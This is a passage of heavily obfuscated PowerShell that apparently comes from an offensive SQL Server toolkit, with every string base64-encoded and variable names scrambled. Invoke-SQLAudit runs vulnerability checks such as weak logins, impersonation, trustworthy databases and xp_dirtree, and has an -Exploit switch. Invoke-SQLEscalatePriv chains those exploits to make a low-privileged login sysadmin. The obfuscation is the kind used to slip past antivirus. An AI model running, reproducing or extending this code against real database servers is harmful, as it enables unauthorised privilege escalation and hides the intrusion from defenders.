                    ${______/\/\/\/\/==} = [Reflection.BindingFlags]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGYAYQB1AGwAdAAsAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlAA==')))
                    ${/==\/=\/\/===\__/} = ($ScriptBlock.ast.gettype().GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVwBpAHQAaABJAG4AcAB1AHQASABhAG4AZABsAGkAbgBnAEYAbwByAEkAbgB2AG8AawBlAEMAbwBtAG0AYQBuAGQASQBtAHAAbAA='))),${______/\/\/\/\/==}))
                    ${_/\/=\____/=\___/} = ${/==\/=\/\/===\__/}.Invoke($ScriptBlock.ast,@(${/=\/==\/\___/==\/}))
                    $ScriptBlock = [scriptblock]::Create(${_/\/=\____/=\___/})
                }
            }
            $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($(${_/=\/=\/\__/\__/\} -Join ', '))`r`n" + $ScriptBlock.ToString())
        }
        else
        {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AHMAdAAgAHAAcgBvAHYAaQBkAGUAIABTAGMAcgBpAHAAdABCAGwAbwBjAGsAIABvAHIAIABTAGMAcgBpAHAAdABGAGkAbABlAA==')))
            Break
        }
        Write-Debug -Message "`$ScriptBlock: $($ScriptBlock | Out-String)"
        If (-not($SuppressVerbose)){
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbgBnACAAcgB1AG4AcwBwAGEAYwBlACAAcABvAG8AbAAgAGEAbgBkACAAcwBlAHMAcwBpAG8AbgAgAHMAdABhAHQAZQBzAA==')))
        }
        ${___/\/\/==\/\/\/\} = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        if ($ImportVariables)
        {
            if(${/=\_/\/=\/\/\__/\}.count -gt 0)
            {
                foreach(${__/\__/\/==\_/\__} in ${/=\_/\/=\/\/\__/\})
                {
                    ${___/\/\/==\/\/\/\}.Variables.Add( (New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList ${__/\__/\/==\_/\__}.Name, ${__/\__/\/==\_/\__}.Value, $null) )
                }
            }
        }
        if ($ImportModules)
        {
            if(${/=\_____/=\_/=\/=}.count -gt 0)
            {
                foreach(${_/==\_/\/==\/====} in ${/=\_____/=\_/=\/=})
                {
                    ${___/\/\/==\/\/\/\}.ImportPSModule(${_/==\_/\/==\/====})
                }
            }
            if(${___/\/\/==\__/\/\}.count -gt 0)
            {
                foreach(${/==\/=\/==\_/\_/\} in ${___/\/\/==\__/\/\})
                {
                    [void]${___/\/\/==\/\/\/\}.ImportPSSnapIn(${/==\/=\/==\_/\_/\}, [ref]$null)
                }
            }
        }
        if($ImportSessionFunctions)
        {
            ls -Path Function:\ |
            ? -FilterScript {
                $_.name -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgA6ACoA')))
            } |
            select -Property name -ExpandProperty name |
            % -Process {
                ${_/\/\___/=\/\/=\/} = gc -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuADoAXAAkAF8A'))) -ErrorAction Stop
                ${/=\__/=\/\_/==\/\} = New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList "$_", ${_/\/\___/=\/\/=\/}
                ${___/\/\/==\/\/\/\}.Commands.Add(${/=\__/=\/\_/==\/\})
            }
        }
        ${__/=\/=\/\/==\__/} = [runspacefactory]::CreateRunspacePool(1, $Throttle, ${___/\/\/==\/\/\/\}, $Host)
        ${__/=\/=\/\/==\__/}.Open()
        ${Script:__/\__/===\/\_/=\} = New-Object -TypeName System.Collections.ArrayList
        ${_/=\/=\__/\/==\__} = $PSBoundParameters.keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AE8AYgBqAGUAYwB0AA==')))
        if(-not ${_/=\/=\__/\/==\__})
        {
            [System.Collections.ArrayList]${_/===\/=\_/======} = @()
        }
        ${_/\__/====\__/\__} = $false
    }
    Process {
        if(${_/=\/=\__/\/==\__})
        {
            ${_/===\/=\_/======} = $InputObject
        }
        Else
        {
            [void]${_/===\/=\_/======}.add( $InputObject )
        }
    }
    End {
        Try
        {
            ${/=\_/=\_/==\/\___} = ${_/===\/=\_/======}.count
            ${script:__/\_/\/\/=\__/=\} = 0
            ${/==\/===\/=\/\__/} = 0
            foreach(${____/=\/==\/\/===} in ${_/===\/=\_/======})
            {
                ${_____/==\/\/=\_/\} = [powershell]::Create()
                if ($VerbosePreference -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA=='))))
                {
                    [void]${_____/==\/\/=\_/\}.AddScript({
                            $VerbosePreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
                    })
                }
                [void]${_____/==\/\/=\_/\}.AddScript($ScriptBlock).AddArgument(${____/=\/==\/\/===})
                if ($Parameter)
                {
                    [void]${_____/==\/\/=\_/\}.AddArgument($Parameter)
                }
                if (${_______/=======\/})
                {
                    Foreach(${______/\__/=\_/==} in ${_______/=======\/})
                    {
                        [void]${_____/==\/\/=\_/\}.AddArgument(${______/\__/=\_/==}.Value)
                    }
                }
                ${_____/==\/\/=\_/\}.RunspacePool = ${__/=\/=\/\/==\__/}
                ${/==\/==\__/\__/\_} = '' | select -Property PowerShell, StartTime, object, Runspace
                ${/==\/==\__/\__/\_}.PowerShell = ${_____/==\/\/=\_/\}
                ${/==\/==\__/\__/\_}.StartTime = Get-Date
                ${/==\/==\__/\__/\_}.object = ${____/=\/==\/\/===}
                ${/==\/==\__/\__/\_}.Runspace = ${_____/==\/\/=\_/\}.BeginInvoke()
                ${/==\/===\/=\/\__/}++
                $null = ${__/\__/===\/\_/=\}.Add(${/==\/==\__/\__/\_})
                Get-RunspaceData
                ${_/\/\/=\/\_/==\/=} = $true
                while (${__/\__/===\/\_/=\}.count -ge $script:MaxQueue)
                {
                    if(${_/\/\/=\/\_/==\/=})
                    {
                    }
                    ${_/\/\/=\/\_/==\/=} = $false
                    Get-RunspaceData
                    sleep -Milliseconds $SleepTimer
                }
            }
            Get-RunspaceData -wait
            if (-not $Quiet)
            {
                Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwAgAFEAdQBlAHIAeQA='))) -Status $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AGkAbgBnACAAdABoAHIAZQBhAGQAcwA='))) -Completed
            }
        }
        Finally
        {
            if ( (${_/\__/====\__/\__} -eq $false) -or ( (${_/\__/====\__/\__} -eq $true) -and ($NoCloseOnTimeout -eq $false) ) )
            {
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBpAG4AZwAgAHQAaABlACAAcgB1AG4AcwBwAGEAYwBlACAAcABvAG8AbAA=')))
                }
                ${__/=\/=\/\/==\__/}.close()
            }
            [gc]::Collect()
        }
    }
}
function Test-Subnet ([string]$cidr, [string]$ip)
{
    $network, [int]$subnetlen = $cidr.Split('/')
    ${_/\/====\/===\_/\} = [uint32[]]$network.split('.')
    [uint32] ${/=\_/\_/\/=\__/==} = (Convert-BitShift ${_/\/====\/===\_/\}[0] -Left 24) + (Convert-BitShift ${_/\/====\/===\_/\}[1] -Left 16) + (Convert-BitShift ${_/\/====\/===\_/\}[2] -Left 8) + ${_/\/====\/===\_/\}[3]
    ${/==\/\/\/\__/\___} = Convert-BitShift (-bnot [uint32]0) -Left (32 - $subnetlen)
    ${_/\/====\/===\_/\} = [uint32[]]$ip.split('.')
    [uint32] ${_________/\__/===} = (Convert-BitShift ${_/\/====\/===\_/\}[0] -Left 24) + (Convert-BitShift ${_/\/====\/===\_/\}[1] -Left 16) + (Convert-BitShift ${_/\/====\/===\_/\}[2] -Left 8) + ${_/\/====\/===\_/\}[3]
    ${/=\_/\_/\/=\__/==} -eq (${/==\/\/\/\__/\___} -band ${_________/\__/===})
}
function Convert-BitShift {
    param (
        [Parameter(Position = 0, Mandatory = $True)]
        [int] $Number,
        [Parameter(ParameterSetName = 'Left', Mandatory = $False)]
        [int] $Left,
        [Parameter(ParameterSetName = 'Right', Mandatory = $False)]
        [int] $Right
    ) 
    ${_______/\_/\/\/=\} = 0
    if ($PSCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAGYAdAA='))))
    { 
        ${_______/\_/\/\/=\} = $Left
    }
    else
    {
        ${_______/\_/\/\/=\} = -$Right
    }
    return [math]::Floor($Number * [math]::Pow(2,${_______/\_/\/\/=\}))
}
Function Invoke-SQLAudit
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Folder to write results to csv.')]
        [string]$OutFolder
    )
    Begin
    {
        if($OutFolder){
            if((Test-FolderWriteAccess $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgA=')))) -eq $false){
                Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBPAFUAIABEAE8ATgBUACAAQQBQAFAARQBBAFIAIABUAE8AIABIAEEAVgBFACAAVwBSAEkAVABFACAAQQBDAEMARQBTAFMAIABUAE8AIABUAEgARQAgAFAAUgBPAFYASQBEAEUARAAgAEQASQBSAEUAQwBUAE8AUgBZAC4A')))
                BREAK
            }
        }        
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
        ${/=\/=\/\___/===\_} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\/=\/\___/===\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AG4AYwB0AGkAbwBuAE4AYQBtAGUA'))))
        $null = ${/=\/=\/\___/===\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAB5AHAAZQA='))))
        ${/=\/=\/\___/===\_}.Clear()
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABPAEEARABJAE4ARwAgAFYAVQBMAE4ARQBSAEEAQgBJAEwASQBUAFkAIABDAEgARQBDAEsAUwAuAA==')))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQARABlAGYAYQB1AGwAdABMAG8AZwBpAG4AUAB3ACAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))))   
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAVwBlAGEAawBMAG8AZwBpAG4AUAB3AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBJAG0AcABlAHIAcwBvAG4AYQB0AGUATABvAGcAaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBTAGUAcgB2AGUAcgBMAGkAbgBrAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBUAHIAdQBzAHQAdwBvAHIAdABoAHkA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBEAGIAQwBoAGEAaQBuAGkAbgBnAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBDAHIAZQBhAHQAZQBQAHIAbwBjAGUAZAB1AHIAZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBYAHAARABpAHIAdAByAGUAZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBYAHAARgBpAGwAZQBlAHgAaQBzAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUgBvAGwAZQBEAGIARABkAGwAQQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUgBvAGwAZQBEAGIATwB3AG4AZQByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUwBhAG0AcABsAGUARABhAHQAYQBCAHkAQwBvAGwAdQBtAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUwBRAEwAaQBTAHAARQB4AGUAYwB1AHQAZQBBAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUwBRAEwAaQBTAHAAUwBpAGcAbgBlAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${/=\/=\/\___/===\_}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBBAHUAdABvAEUAeABlAGMAUwBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA==')))) 
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBVAE4ATgBJAE4ARwAgAFYAVQBMAE4ARQBSAEEAQgBJAEwASQBUAFkAIABDAEgARQBDAEsAUwAuAA==')))
    }
    Process
    {
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Return
        }
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgBVAE4ATgBJAE4ARwAgAFYAVQBMAE4ARQBSAEEAQgBJAEwASQBUAFkAIABDAEgARQBDAEsAUwAuAC4ALgA=')))
        ${/=\/=\/\___/===\_} |
        % -Process {
            ${/=\_/\/\_/===\/=\} = $_.FunctionName
            if($Exploit)
            {
                ${/===\/==\__/=\/\/} = iex -Command $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8ALwBcAC8AXABfAC8APQA9AD0AXAAvAD0AXAB9ACAALQBJAG4AcwB0AGEAbgBjAGUAIAAnACQASQBuAHMAdABhAG4AYwBlACcAIAAtAFUAcwBlAHIAbgBhAG0AZQAgACcAJABVAHMAZQByAG4AYQBtAGUAJwAgAC0AUABhAHMAcwB3AG8AcgBkACAAJwAkAFAAYQBzAHMAdwBvAHIAZAAnACAALQBFAHgAcABsAG8AaQB0AA==')))
            }
            else
            {
                ${/===\/==\__/=\/\/} = iex -Command $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8ALwBcAC8AXABfAC8APQA9AD0AXAAvAD0AXAB9ACAALQBJAG4AcwB0AGEAbgBjAGUAIAAnACQASQBuAHMAdABhAG4AYwBlACcAIAAtAFUAcwBlAHIAbgBhAG0AZQAgACcAJABVAHMAZQByAG4AYQBtAGUAJwAgAC0AUABhAHMAcwB3AG8AcgBkACAAJwAkAFAAYQBzAHMAdwBvAHIAZAAnAA==')))
            }
            ${_/=\/\_/=====\/\_} = ${_/=\/\_/=====\/\_} + ${/===\/==\__/=\/\/}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLAC4A')))
    }
    End
    {
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBPAE0AUABMAEUAVABFAEQAIABBAEwATAAgAFYAVQBMAE4ARQBSAEEAQgBJAEwASQBUAFkAIABDAEgARQBDAEsAUwAuAA==')))
        if($OutFolder)
        {
            ${/=\/=\__/=\/\___/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBjAGgAbwAgAHQAZQBzAHQAIAA+ACAAJABPAHUAdABGAG8AbABkAGUAcgBcAHQAZQBzAHQALgB0AHgAdAA=')))
            ${/==\__/==\/\_/\_/} = (iex -Command ${/=\/=\__/=\/\___/}) 2>&1
            if(${/==\__/==\/\_/\_/} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBkAGUAbgBpAGUAZAAuAA=='))))
            {
                Write-Verbose -Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAIABkAGUAbgBpAGUAZAAgAHQAbwAgAG8AdQB0AHAAdQB0ACAAZABpAHIAZQBjAHQAbwByAHkALgA=')))
                Return
            }
            else
            {
                Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAaQBmAGkAZQBkACAAdwByAGkAdABlACAAYQBjAGMAZQBzAHMAIAB0AG8AIABvAHUAdABwAHUAdAAgAGQAaQByAGUAYwB0AG8AcgB5AC4A')))
                ${/===\/\___/\/\/\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGwAIAAkAE8AdQB0AEYAbwBsAGQAZQByAFwAdABlAHMAdAAuAHQAeAB0AA==')))
                iex -Command ${/===\/\___/\/\/\_}
                ${___/\/===\__/\__/} = $Instance.Replace('\','-').Replace(',','-')
                ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcAA==')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFUAcABTAFEATABfAEEAdQBkAGkAdABfAFIAZQBzAHUAbAB0AHMAXwA=')))+${___/\/===\__/\__/}+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBjAHMAdgA=')))
                ${___/\/===\__/\__/}
                ${_/\_/=\_/===\/\/\}
                ${_/=\/\_/=====\/\_}  | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
            }
        }
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function Invoke-SQLEscalatePriv
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance
    )
    Begin
    {
    }
    Process
    {
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Return
        }
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBoAGUAYwBrAGkAbgBnACAAaQBmACAAeQBvAHUAJwByAGUAIABhAGwAcgBlAGEAZAB5ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuAC4ALgA=')))
        ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAsACAAcwBvACAAbgBvAHQAaABpAG4AZwAgAHQAbwAgAGQAbwAgAGgAZQByAGUALgAgADoAKQA=')))
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAJwByAGUAIABuAG8AdAAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALAAgAGEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABjAGgAYQBuAGcAZQAgAHQAaABhAHQALgAuAC4A')))
            Invoke-SQLAudit -Instance $Instance -Username $Username -Password $Password -Credential $Credential -NoOutput -Exploit
            ${_/=\__/=\_/=\/\/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
            if(${_/=\__/=\_/=\/\/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwB1AGMAYwBlAHMAcwAhACAAWQBvAHUAIABhAHIAZQAgAG4AbwB3ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAhAA==')))
            }
            else
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARgBhAGkAbAAuACAAVwBlACAAYwBvAHUAbABkAG4AJwB0ACAAZwBlAHQAIAB5AG8AdQAgAHMAeQBzAGEAZABtAGkAbgAgAGEAYwBjAGUAcwBzACAAdABvAGQAYQB5AC4A')))
            }
        }
    }
    End
    {
    }
}
Function Invoke-SQLDumpInfo
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Folder to write output to.')]
        [string]$OutFolder,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Write output to xml files.')]
        [switch]$xml,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Write output to csv files.')]
